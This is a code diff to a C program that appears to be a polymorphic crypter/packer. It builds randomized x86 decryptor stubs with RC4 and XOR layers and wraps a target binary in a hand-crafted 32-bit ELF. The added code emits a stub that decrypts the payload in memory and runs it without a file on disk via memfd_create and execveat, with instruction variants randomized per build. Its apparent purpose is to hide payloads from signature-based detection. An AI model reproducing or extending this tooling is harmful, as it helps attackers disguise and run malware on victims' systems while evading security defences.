@@ -14,6 +14,7 @@
 
 #define __NR_execveat	  358
 #define __NR_memfd_create 356
+#define __NR_write			4
 
 #define PAGE_SIZE 		 4096
 #define	PAGE_ALIGN(k) 		 (((k)+((PAGE_SIZE)-1))&(~((PAGE_SIZE)-1)))
@@ -86,8 +87,13 @@
 #define INVOKE_RANDFUNC(arr, ...)	arr[genrand(sizeof(arr)/sizeof(uintptr_t))](__VA_ARGS__)
 #define CONF_PRESERVE_REGISTERS	0x1
 #define CONF_RC4_CIPHER		0x2
-#define CONF_OUTPUT			0x3
-	
+#define CONF_OUTPUT			0x10
+#define CONF_START			0x100
+#define CONF_END			0x1000
+
+static uint32_t g_TargetBuff;
+static uint32_t g_TargetBuff_size;
+
 void pushad_0 (uint8_t *, uint32_t *);
 void pushad_1 (uint8_t *, uint32_t *);
 void popad_0 (uint8_t *, uint32_t *);
@@ -734,9 +740,6 @@ void sbtg_write (uint8_t *decryptor_buff, uint32_t *offset, size_t size, uint8_t
 	}
 }
 
-void sbtg_memfd_creat(uint8_t *decryptor_buff, uint32_t *offset) {
-}
-
 /*
 void sbtg_memfd_cre(uint8_t *decryptor_buff, uint32_t *offset, uint32_t sysn, uint32_t nargs, ...) {
 	va_list vl;
@@ -1063,6 +1066,71 @@ void Sbtg_RC4 (uint8_t *decryptor_buff, size_t decryptor_buff_size, uint32_t *co
 	cjmp_near_imm_0(decryptor_buff, code_offset, loop_start1, CJMP_NZ_);
 }
 
+static inline int _execveat(int dirfd, const char *pathname, char *const argv[], char *const envp[], int flags) {
+	return syscall(__NR_execveat, dirfd, pathname, argv, envp, flags);
+}
+
+static inline int _memfd_create(const char *name, unsigned int flags) {
+	return syscall(__NR_memfd_create, name, flags);
+}
+
+
+	/*
+	fd = _memfd_create("", 0);
+	write(fd, target_buff, target_buff_size);
+	_execveat(fd, "", NULL, NULL, AT_EMPTY_PATH);
+	*/
+
+void sbtg_memfd_creat(uint8_t *decryptor_buff, uint32_t *offset) {
+	uint32_t vreg = REG_EAX;
+	
+	INVOKE_RANDFUNC(zero_reg_variants_arr, decryptor_buff, offset, REG_ECX);
+
+	mov_reg_imm_0 (decryptor_buff, offset, vreg,  0x00414141);
+	INVOKE_RANDFUNC(push_variants_arr, decryptor_buff, offset, vreg);
+	INVOKE_RANDFUNC(mov_reg_reg_variants_arr, decryptor_buff, offset, REG_ESP, REG_EBX);
+
+	mov_reg_imm_0 (decryptor_buff, offset, vreg,  __NR_memfd_create);
+	INVOKE_RANDFUNC(push_variants_arr, decryptor_buff, offset, vreg);
+	INVOKE_RANDFUNC(pop_variants_arr, decryptor_buff, offset, REG_EAX);
+
+	*(uint16_t*)(decryptor_buff + *offset) = OP_INT_x80;
+	*offset += sizeof(uint16_t);
+	INVOKE_RANDFUNC(push_variants_arr, decryptor_buff, offset, REG_EAX);
+
+	INVOKE_RANDFUNC(mov_reg_reg_variants_arr, decryptor_buff, offset, REG_EAX, REG_EBX);
+	mov_reg_imm_0 (decryptor_buff, offset, vreg,  g_TargetBuff);
+	INVOKE_RANDFUNC(mov_reg_reg_variants_arr, decryptor_buff, offset, vreg, REG_ECX);
+	mov_reg_imm_0 (decryptor_buff, offset, vreg,  g_TargetBuff_size);
+	INVOKE_RANDFUNC(mov_reg_reg_variants_arr, decryptor_buff, offset, vreg, REG_EDX);
+	
+	mov_reg_imm_0 (decryptor_buff, offset, vreg,  __NR_write);
+	INVOKE_RANDFUNC(push_variants_arr, decryptor_buff, offset, vreg);
+	INVOKE_RANDFUNC(pop_variants_arr, decryptor_buff, offset, REG_EAX);
+
+	*(uint16_t*)(decryptor_buff + *offset) = OP_INT_x80;
+	*offset += sizeof(uint16_t);
+	
+	INVOKE_RANDFUNC(zero_reg_variants_arr, decryptor_buff, offset, REG_EDX);
+	INVOKE_RANDFUNC(zero_reg_variants_arr, decryptor_buff, offset, REG_ESI);	
+	INVOKE_RANDFUNC(pop_variants_arr, decryptor_buff, offset, REG_EBX);
+	
+	INVOKE_RANDFUNC(zero_reg_variants_arr, decryptor_buff, offset, REG_ECX);
+	INVOKE_RANDFUNC(push_variants_arr, decryptor_buff, offset, REG_ECX);
+	INVOKE_RANDFUNC(mov_reg_reg_variants_arr, decryptor_buff, offset, REG_ESP, REG_ECX);
+	
+	mov_reg_imm_0 (decryptor_buff, offset, vreg,  AT_EMPTY_PATH);
+	INVOKE_RANDFUNC(mov_reg_reg_variants_arr, decryptor_buff, offset, vreg, REG_EDI);
+	mov_reg_imm_0 (decryptor_buff, offset, vreg,  __NR_execveat);
+	INVOKE_RANDFUNC(mov_reg_reg_variants_arr, decryptor_buff, offset, vreg, REG_EAX);
+
+	*(uint16_t*)(decryptor_buff + *offset) = OP_INT_x80;
+	*offset += sizeof(uint16_t);
+
+	mov_reg_imm_0 (decryptor_buff, offset, REG_EAX,  1);
+	*(uint16_t*)(decryptor_buff + *offset) = OP_INT_x80;
+	*offset += sizeof(uint16_t);
+}
 
 void Sbtg(uint8_t *decryptor_buff, size_t *decryptor_buff_size, uint8_t *key, uint32_t flags) {
 	uint32_t code_offset = 0;
@@ -1071,8 +1139,18 @@ void Sbtg(uint8_t *decryptor_buff, size_t *decryptor_buff_size, uint8_t *key, ui
 
 	memset(decryptor_buff, OP_NOP, *decryptor_buff_size);
 
-	INVOKE_RANDFUNC(prelude_variants_arr, decryptor_buff, &code_offset);
 	
+	if (flags & CONF_START) {
+		uint32_t vreg = genrand(4);
+		mov_reg_imm_0 (decryptor_buff, &code_offset, vreg,  g_TargetBuff_size);
+		INVOKE_RANDFUNC(push_variants_arr, decryptor_buff, &code_offset, vreg);
+		mov_reg_imm_0 (decryptor_buff, &code_offset, vreg,  g_TargetBuff);
+		INVOKE_RANDFUNC(push_variants_arr, decryptor_buff, &code_offset, vreg);
+		call_near_0(decryptor_buff, &code_offset, code_offset+sizeof(uint32_t));
+	}
+
+	INVOKE_RANDFUNC(prelude_variants_arr, decryptor_buff, &code_offset);
+
 	if (flags & CONF_PRESERVE_REGISTERS) {
 		INVOKE_RANDFUNC(pushad_variants_arr, decryptor_buff, &code_offset);
 	}
@@ -1087,12 +1165,21 @@ void Sbtg(uint8_t *decryptor_buff, size_t *decryptor_buff_size, uint8_t *key, ui
 		INVOKE_RANDFUNC(popad_variants_arr, decryptor_buff, &code_offset);
 	}
 
-	*decryptor_buff_size = code_offset;
-
 	INVOKE_RANDFUNC(epilogue_variants_arr, decryptor_buff, &code_offset);
-	*(uint8_t*)(decryptor_buff + code_offset) = OP_RET;
-	code_offset += sizeof(uint8_t);
 
+	if (flags & CONF_OUTPUT) {
+		*(uint8_t*)(decryptor_buff + code_offset) = OP_NOP;
+		code_offset += sizeof(uint8_t);
+	} else {
+		*(uint8_t*)(decryptor_buff + code_offset) = OP_RET;
+		code_offset += sizeof(uint8_t);
+	}
+
+	if (flags & CONF_END) {
+		sbtg_memfd_creat(decryptor_buff, &code_offset);
+	}
+
+	*decryptor_buff_size = code_offset;
 }
 
 bool alloc_file(int *fd, struct stat *st, const char *filename, uint8_t **buf) { 
@@ -1108,14 +1195,6 @@ bool alloc_file(int *fd, struct stat *st, const char *filename, uint8_t **buf) {
        		return false;
    	}   
    	return true;
-}
-
-static inline int _execveat(int dirfd, const char *pathname, char *const argv[], char *const envp[], int flags) {
-	return syscall(__NR_execveat, dirfd, pathname, argv, envp, flags);
-}
-
-static inline int _memfd_create(const char *name, unsigned int flags) {
-	return syscall(__NR_memfd_create, name, flags);
 }
 
 int craft_decryptor(uint8_t *target_buff, int target_buff_size) {
@@ -1144,31 +1223,29 @@ int craft_decryptor(uint8_t *target_buff, int target_buff_size) {
 		return -1; 
 
 	}
-	
+
 	sbtg_get_random_str(xor_key, sizeof(xor_key));
 	sbtg_get_random_str(rc4_key, sizeof(rc4_key));
 	output_file_offset = sizeof(Elf32_Ehdr) + sizeof(Elf32_Phdr);
 
 	Sbtg(decryptor_buff, &decryptor_buff_size, rc4_key, CONF_PRESERVE_REGISTERS|CONF_RC4_CIPHER);
 	(*decryptor_entry)(target_buff, target_buff_size);
- 	
-	pwrite(fd, decryptor_buff, decryptor_buff_size, output_file_offset);
-	output_file_offset += decryptor_buff_size;
-
 	Sbtg(decryptor_buff, &decryptor_buff_size, xor_key, CONF_PRESERVE_REGISTERS);
 	(*decryptor_entry)(target_buff, target_buff_size);
- 	
-	pwrite(fd, decryptor_buff, decryptor_buff_size, output_file_offset);
-	output_file_offset += decryptor_buff_size;
+	
 	pwrite(fd, target_buff, target_buff_size, output_file_offset);
 	output_file_offset += target_buff_size;
+	
+	g_TargetBuff = 0x8048000 + sizeof(Elf32_Ehdr) + sizeof(Elf32_Phdr);
+	g_TargetBuff_size = target_buff_size;
 
-	Sbtg(decryptor_buff, &decryptor_buff_size, xor_key, CONF_PRESERVE_REGISTERS);
-	(*decryptor_entry)(target_buff, target_buff_size);
-	Sbtg(decryptor_buff, &decryptor_buff_size, rc4_key, CONF_PRESERVE_REGISTERS|CONF_RC4_CIPHER);
-	(*decryptor_entry)(target_buff, target_buff_size);
+	Sbtg(decryptor_buff, &decryptor_buff_size, xor_key, CONF_PRESERVE_REGISTERS|CONF_OUTPUT|CONF_START);
+	pwrite(fd, decryptor_buff, decryptor_buff_size, output_file_offset);
+	output_file_offset += decryptor_buff_size;
 
-	pwrite(fd, target_buff, target_buff_size, output_file_offset);
+	Sbtg(decryptor_buff, &decryptor_buff_size, rc4_key, CONF_PRESERVE_REGISTERS|CONF_RC4_CIPHER|CONF_OUTPUT|CONF_END);
+	pwrite(fd, decryptor_buff, decryptor_buff_size, output_file_offset);
+	output_file_offset += decryptor_buff_size;
 
 	ehdr.e_ident[EI_MAG0] = 0x7f;
 	ehdr.e_ident[EI_MAG1] = 'E';
@@ -1182,7 +1259,7 @@ int craft_decryptor(uint8_t *target_buff, int target_buff_size) {
 	ehdr.e_type = ET_EXEC;
 	ehdr.e_machine = EM_386;
 	ehdr.e_version = EV_CURRENT;
-	ehdr.e_entry = 0x8048000 + sizeof(Elf32_Ehdr) + sizeof(Elf32_Phdr);
+	ehdr.e_entry = 0x8048000 + sizeof(Elf32_Ehdr) + sizeof(Elf32_Phdr) + target_buff_size;
 	ehdr.e_ehsize = sizeof(Elf32_Ehdr);
 	ehdr.e_flags = 0;
 	ehdr.e_phoff = sizeof(Elf32_Ehdr);
@@ -1206,10 +1283,6 @@ int craft_decryptor(uint8_t *target_buff, int target_buff_size) {
 	pwrite(fd, &phdr,sizeof(Elf32_Phdr), sizeof(Elf32_Ehdr));
 	close(fd);
 	
-	fd = _memfd_create("", 0);
-	write(fd, target_buff, target_buff_size);
-	_execveat(fd, "", NULL, NULL, AT_EMPTY_PATH);
-
 	return 0;
 
 }
